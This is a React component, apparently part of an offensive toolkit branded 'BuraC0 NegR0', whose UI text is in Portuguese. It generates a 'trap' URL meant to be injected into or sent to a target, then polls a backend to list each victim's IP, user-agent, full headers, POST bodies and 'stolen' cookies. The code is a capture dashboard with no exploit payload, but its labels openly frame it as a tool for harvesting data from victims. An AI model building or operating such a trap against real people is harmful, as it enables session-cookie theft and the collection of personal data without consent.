import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';
import { useAuth } from '../context/AuthContext';
import { RadioReceiver, Copy, RefreshCw, Trash2, Crosshair, Globe, Monitor, Code, ShieldAlert, Cpu } from 'lucide-react';
import './RequestCatcher.css';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;

const RequestCatcher = () => {
  const { token } = useAuth();
  const [catcherToken, setCatcherToken] = useState(localStorage.getItem('catcher_token') || null);
  const [captureUrl, setCaptureUrl] = useState(localStorage.getItem('catcher_url') || null);
  const [logs, setLogs] = useState([]);
  const [isPolling, setIsPolling] = useState(false);
  const [selectedLog, setSelectedLog] = useState(null);
  const intervalRef = useRef(null);

  useEffect(() => {
    if (catcherToken && isPolling) {
      startPolling();
    }
    return () => stopPolling();
  }, [catcherToken, isPolling]);

  const generateEndpoint = async () => {
    try {
      const response = await axios.post(`${BACKEND_URL}/api/tools/catcher/generate`, {}, {
        headers: { Authorization: `Bearer ${token}` }
      });
      const newToken = response.data.token;
      const newUrl = response.data.capture_url;
      
      setCatcherToken(newToken);
      setCaptureUrl(newUrl);
      setLogs([]);
      setSelectedLog(null);
      setIsPolling(true);
      
      localStorage.setItem('catcher_token', newToken);
      localStorage.setItem('catcher_url', newUrl);
    } catch (err) {
      console.error("Erro ao gerar Request Catcher endpoint:", err);
    }
  };

  const fetchLogs = async () => {
    if (!catcherToken) return;
    try {
      const response = await axios.get(`${BACKEND_URL}/api/tools/catcher/logs/${catcherToken}`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      setLogs(response.data.logs);
    } catch (err) {
      console.error("Erro ao buscar logs:", err);
    }
  };

  const startPolling = () => {
    if (intervalRef.current) clearInterval(intervalRef.current);
    fetchLogs(); // Manda buscar 1x imediatamente
    intervalRef.current = setInterval(fetchLogs, 3000); // Polling a cada 3s
  };

  const stopPolling = () => {
    if (intervalRef.current) clearInterval(intervalRef.current);
  };

  const togglePolling = () => {
    setIsPolling(!isPolling);
  };

  const copyUrl = () => {
    if (captureUrl) {
      navigator.clipboard.writeText(captureUrl);
      alert('URL copiada para acesso (Injete ou envie para o Alvo)!');
    }
  };

  const formatTime = (isoString) => {
    const d = new Date(isoString);
    return `${d.getHours().toString().padStart(2,'0')}:${d.getMinutes().toString().padStart(2,'0')}:${d.getSeconds().toString().padStart(2,'0')}`;
  };

  return (
    <div className="request-catcher-page page-container">
      <header className="page-header">
        <h1>
          <RadioReceiver size={32} />
          BuraC0 NegR0 :: Request Catcher
        </h1>
        <p>Gere um link malicioso e intercepte GET, POST, Cookies e IP de todas as vítimas que o acessarem.</p>
      </header>

      <div className="catcher-control-panel">
        {!catcherToken ? (
          <div className="empty-state">
            <RadioReceiver size={48} className="pulse-icon" />
            <h2>Nenhum Coletor Ativo</h2>
            <p>Clique abaixo para gerar uma URL de armadilha única.</p>
            <button className="btn-primary" onClick={generateEndpoint}>
              <Crosshair size={18} /> INICIAR ARMADILHA
            </button>
          </div>
        ) : (
          <div className="active-state">
             <div className="url-banner">
                <span className="label">Endpoint da Armadilha:</span>
                <code className="trap-url">{captureUrl}</code>
                <div className="btn-group">
                   <button className="btn-secondary" onClick={copyUrl} title="Copiar"><Copy size={16} /></button>
                   <button className="btn-warning" onClick={generateEndpoint} title="Regerar um novo endpoint (Apaga os logs antigos)"><RefreshCw size={16} /></button>
                </div>
             </div>
             
             <div className="status-control">
                <div className={`status-indicator ${isPolling ? 'active' : 'paused'}`}>
                   {isPolling ? <><ActivityPulse /> ESCUTANDO NA REDE...</> : <><Monitor size={16} /> ESCUTA PAUSADA</>}
                </div>
                <button className={`btn-${isPolling ? 'danger' : 'success'}`} onClick={togglePolling}>
                  {isPolling ? 'Parar Interceptação' : 'Retomar Interceptação'}
                </button>
             </div>
          </div>
        )}
      </div>

      {catcherToken && (
        <div className="catcher-dashboard">
          
          <div className="logs-list-panel">
            <h3><Globe size={18}/> Conexões Interceptadas ({logs.length})</h3>
            
            {logs.length === 0 ? (
               <p className="no-data">Nenhuma vítima capturada na armadilha (ainda...).</p>
            ) : (
              <div className="logs-scroller">
                 {logs.map((log, index) => (
                    <div 
                      key={index} 
                      className={`log-item ${selectedLog === log ? 'selected' : ''} method-${log.method.toLowerCase()}`}
                      onClick={() => setSelectedLog(log)}
                    >
                      <span className="log-time">[{formatTime(log.timestamp)}]</span>
                      <span className={`method-badge ${log.method.toLowerCase()}`}>{log.method}</span>
                      <span className="log-ip">{log.client_ip}</span>
                    </div>
                 ))}
              </div>
            )}
          </div>

          <div className="log-detail-panel">
            {selectedLog ? (
              <div className="detail-view fade-in">
                 <div className="detail-header">
                    <h3>Detalhes do Ataque Interceptado</h3>
                    <div className="victim-ip"><Cpu size={16} className="inline-icon"/> <span>{selectedLog.client_ip}</span></div>
                 </div>
                 
                 <div className="detail-grid">
                    <div className="data-box url-box">
                       <h4><Globe size={16}/> Path & URL Params</h4>
                       <code>{selectedLog.url}</code>
                    </div>
                    
                    <div className="data-box headers-box">
                       <h4><Code size={16}/> User-Agent</h4>
                       <code>{selectedLog.headers['user-agent'] || 'Desconhecido / Camuflado'}</code>
                    </div>
                 </div>

                 <div className="data-box full-headers">
                    <h4>Cabeçalhos Críticos (Headers)</h4>
                    <pre>
                      {Object.entries(selectedLog.headers).map(([key, val]) => (
                         <div key={key}><strong>{key}:</strong> {val}</div>
                      ))}
                    </pre>
                 </div>

                 <div className="data-box cookies-box">
                    <h4><ShieldAlert size={16} className={Object.keys(selectedLog.cookies).length > 0 ? "text-red" : ""}/> Cookies Expostos ({Object.keys(selectedLog.cookies).length})</h4>
                    {Object.keys(selectedLog.cookies).length > 0 ? (
                      <pre>
                        {Object.entries(selectedLog.cookies).map(([key, val]) => (
                           <div key={key}><strong>{key}=</strong>{val}</div>
                        ))}
                      </pre>
                    ) : (
                      <p className="neutral-text">Nenhum cookie roubado nesta requisição.</p>
                    )}
                 </div>

                 {selectedLog.body && selectedLog.body.length > 0 && selectedLog.method !== 'GET' && (
                   <div className="data-box body-box">
                      <h4>Dados de POST/Payload Body</h4>
                      <pre>{selectedLog.body}</pre>
                   </div>
                 )}
              </div>
            ) : (
              <div className="empty-detail">
                 <Monitor size={48} />
                 <p>Selecione um log capturado à esquerda para destrinchar os dados da vítima.</p>
              </div>
            )}
          </div>
        </div>
      )}

    </div>
  );
};

const ActivityPulse = () => (
  <span className="signal-waves">
    <span className="wave"></span><span className="wave"></span><span className="wave"></span>
  </span>
);

export default RequestCatcher;
